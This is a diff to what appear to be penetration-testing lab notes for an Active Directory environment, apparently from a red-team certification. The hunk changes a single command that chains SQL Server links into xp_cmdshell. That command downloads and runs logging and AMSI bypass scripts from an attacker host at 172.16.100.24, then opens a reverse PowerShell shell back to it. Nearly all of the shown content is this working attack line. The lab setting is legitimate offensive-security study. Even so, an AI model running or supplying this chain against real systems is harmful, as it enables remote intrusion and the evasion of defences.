@@ -1276,7 +1276,7 @@ Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
 RCE via SQL server with AMSI bypass
 
 ```bash
-Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.x/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sqlx
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.24/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.24/Amsi-Byp.txt);iex (iwr -UseBasicParsing http://172.16.100.24/Invoke-PowerShellTcpEx.ps1); Power -Reverse -IPAddress 172.16.100.24 -Port 433"''' -QueryTarget eu-sql26
 ```
 
 Run .exe file from SMB share
